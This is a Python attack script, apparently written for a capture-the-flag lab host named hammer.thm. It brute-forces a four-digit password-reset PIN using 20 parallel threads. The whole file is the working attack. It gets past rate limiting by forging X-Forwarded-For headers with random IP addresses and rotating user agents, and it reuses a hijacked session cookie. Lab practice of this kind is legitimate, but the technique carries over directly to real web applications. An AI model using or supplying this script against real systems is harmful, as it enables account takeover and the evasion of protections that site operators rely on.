#!/usr/bin/env python3
import concurrent.futures
import os
from random import randrange
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
import requests
import time

os.system ("clear")

url = 'http://hammer.thm:1337/reset_password.php'

#You can get this by intercepting the request in Burp
cookies = {'PHPSESSID': 'pi6a8avhrveljhjv5po63drjog'}

#These are the digits we are going to try and brute force the recovery PIN with
#0000 - 9999
digits_to_hammer = [ 
  'digits_0_A.txt', 
  'digits_1_A.txt', 
  'digits_2_A.txt', 
  'digits_3_A.txt', 
  'digits_4_A.txt', 
  'digits_5_A.txt', 
  'digits_6_A.txt', 
  'digits_7_A.txt', 
  'digits_8_A.txt', 
  'digits_9_A.txt', 
  'digits_0_B.txt', 
  'digits_1_B.txt', 
  'digits_2_B.txt', 
  'digits_3_B.txt', 
  'digits_4_B.txt', 
  'digits_5_B.txt', 
  'digits_6_B.txt', 
  'digits_7_B.txt', 
  'digits_8_B.txt', 
  'digits_9_B.txt' 
] 

def make_request(digits):

  print ("Digits we are using are: " + digits)

  with open(digits) as file:
    for item in file:
        print (item)
        item = item.strip()
        data = {'recovery_code': item, 's':'111'}

        #Faking my IP in headers to avoid rate limiting.  Randomizing three octets is needed or it will ban us.
        pick_a_number_4th_octet = (randrange(254))
        #print (pick_a_number)
        pick_a_number_4th_octet = str(pick_a_number_4th_octet)

        pick_a_number_3rd_octet = (randrange(250))
        #print (pick_a_number)
        pick_a_number_3rd_octet = str(pick_a_number_3rd_octet)

        pick_a_number_2nd_octet = (randrange(250))
        #print (pick_a_number)
        pick_a_number_2nd_octet = str(pick_a_number_2nd_octet)

        fake_ip = '10.' + pick_a_number_2nd_octet + '.' + pick_a_number_3rd_octet + '.' + pick_a_number_4th_octet 

        #print (fake_ip)

        #Set a random UA to evade rate limiting
        software_names = [SoftwareName.CHROME.value]
        operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]   

        user_agent_rotator = UserAgent(software_names=software_names, operating_systems=operating_systems, limit=100)

        # Get list of user agents.
        user_agents = user_agent_rotator.get_user_agents()

        # Get Random User Agent String.
        user_agent = user_agent_rotator.get_random_user_agent()
        #print (user_agent)

        # Set up the headers
        # Use a fake IP at random and random user agent
        headers = {
                'X-Forwarded-For': fake_ip,
                'User-Agent': user_agent
        }


        # Send POST request with FORM data using the data parameter
        # Have to use cookie or will say time elapsed
        response = requests.post(url, data=data, cookies=cookies, headers=headers)

        # Print the response
        if "Invalid or expired recovery code" in response.text:

          #print ("Invalid!")
          next;

        elif "Time elapsed" in response.text:

          print ("We've run out of time")
          exit (1)

        elif "Rate limit exceeded" in response.text:

          print ("Hit Rate limiting limit")
        
        else:

          print(response.text)
          print ("Yo Yo Yo!!!! The PIN is: " + item)
          exit (0)

def download_all_urls_threadpool(digits_to_hammer):
    contents = []

    # Use a thread pool beat the clock.  180 seconds to try 10000 possible PINs
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        #Call make_request function with all the elements of the digits_to_hammer list as arguments
        futures = [executor.submit(make_request, digits) for digits in digits_to_hammer]

        # Wait for all futures to complete
        for future in concurrent.futures.as_completed(futures):
            content = future.result()
            contents.append(content)

    return contents

download_all_urls_threadpool(digits_to_hammer)